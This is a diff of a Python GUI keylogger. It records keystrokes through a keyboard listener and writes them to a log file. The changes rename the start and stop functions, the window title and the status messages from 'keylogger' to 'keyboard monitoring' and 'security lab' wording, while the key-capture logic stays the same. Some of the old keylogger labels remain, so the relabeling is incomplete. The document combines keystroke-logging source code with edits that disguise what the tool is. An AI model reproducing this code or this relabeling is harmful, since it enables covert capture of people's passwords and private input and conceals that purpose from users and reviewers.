@@ -45,15 +45,15 @@ def on_release(key):
     keys = keys + str(key)
     generate_text_log(str(keys))
 
-def start_keylogger():
+def start_monitoring():
     global listener
     listener = keyboard.Listener(on_press=on_press, on_release=on_release)
     listener.start()
-    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'")
+    label.config(text="[+] Keyboard monitoring demo is running\n[!] Output saved for analysis")
     start_button.config(state='disabled')
     stop_button.config(state='normal')
 
-def stop_keylogger():
+def stop_monitoring():
     global listener
     listener.stop()
     label.config(text="Keylogger stopped.")
@@ -61,7 +61,7 @@ def stop_keylogger():
     stop_button.config(state='disabled')
 
 root = Tk()
-root.title("Keylogger")
+root.title("Keyboard Monitoring Security Lab")
 
 label = Label(root, text='Click "Start" to begin keylogging.')
 label.config(anchor=CENTER)
@@ -76,4 +76,5 @@ stop_button.pack(side=RIGHT)
 root.geometry("250x250")
 
 root.mainloop()
+
 
